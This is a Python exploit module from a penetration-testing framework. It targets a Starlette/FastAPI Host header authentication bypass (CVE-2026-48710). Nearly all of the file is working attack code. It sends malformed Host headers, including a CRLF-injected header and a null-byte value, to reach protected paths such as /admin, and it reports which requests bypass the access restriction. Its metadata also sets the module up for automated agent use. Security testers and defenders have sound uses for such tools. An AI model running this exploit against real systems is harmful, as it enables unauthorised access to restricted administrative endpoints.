#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Starlette Host header bypass (CVE-2026-48710) — auth restriction evasion."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Starlette Host Header Auth Bypass (CVE-2026-48710)',
        'description': (
            'Exploits CVE-2026-48710 by sending a malformed Host header so '
            'request.url differs from the raw scope path, bypassing middleware '
            'and endpoint restrictions that rely on request.url validation.'
        ),
        'author': ['KittySploit Team'],
        'cve': ['CVE-2026-48710'],
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2026-48710',
            'https://github.com/Kludex/starlette/security/advisories/GHSA-86qp-5c8j-p5mr',
        ],
        'tags': ['starlette', 'fastapi', 'host', 'auth-bypass', 'badhost', 'asgi'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe', 'auth_bypass'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': True,
            'produces': ['exploit_paths', 'risk_signals'],
            'chain': {
                'produces_capabilities': [{'capability': 'auth_bypass', 'from_detail': 'host header'}],
                'suggested_followups': ['scanner/http/cve_2026_48710_detect'],
            },
        },
    }

    protected_path = OptString('/admin', 'Protected path to reach via Host bypass', required=False)
    bypass_host = OptString('127.0.0.1', 'Malformed Host header value for bypass', required=False)
    probe_body = OptString('', 'Optional POST body for protected endpoint', required=False)

    def _malformed_hosts(self):
        base = str(self.bypass_host or '127.0.0.1').strip()
        return [
            f'{base}\r\nX-Injected: kitty',
            f'{base}:',
            f'{base}\x00.local',
            f'[{base}]',
        ]

    def check(self):
        path = str(self.protected_path or '/admin').strip()
        if not path.startswith('/'):
            path = f'/{path}'
        baseline = self.http_request(method='GET', path=path, allow_redirects=False)
        if not baseline:
            return False
        if baseline.status_code in (200, 201):
            return True
        for host in self._malformed_hosts():
            r = self.http_request(
                method='GET',
                path=path,
                headers={'Host': host},
                allow_redirects=False,
            )
            if r and r.status_code in (200, 201) and baseline.status_code in (401, 403, 404):
                return True
        return False

    def run(self):
        path = str(self.protected_path or '/admin').strip()
        if not path.startswith('/'):
            path = f'/{path}'
        body = str(self.probe_body or '').strip()
        baseline = self.http_request(method='GET', path=path, allow_redirects=False)
        baseline_code = int(getattr(baseline, 'status_code', 0) or 0)
        findings = []
        for host in self._malformed_hosts():
            kwargs = {'method': 'GET', 'path': path, 'headers': {'Host': host}, 'allow_redirects': False}
            if body:
                kwargs['method'] = 'POST'
                kwargs['data'] = body
                kwargs.setdefault('headers', {})['Content-Type'] = 'application/json'
            r = self.http_request(**kwargs)
            if not r:
                continue
            code = int(r.status_code or 0)
            if code in (200, 201) and baseline_code in (401, 403, 404):
                findings.append({'host': host, 'path': path, 'status': code})
                print_success(f'Host bypass succeeded: Host={host!r} → HTTP {code}')
        if findings:
            return {'vulnerable': True, 'findings': findings}
        print_status('No Host header bypass observed')
        return {'vulnerable': False, 'findings': []}
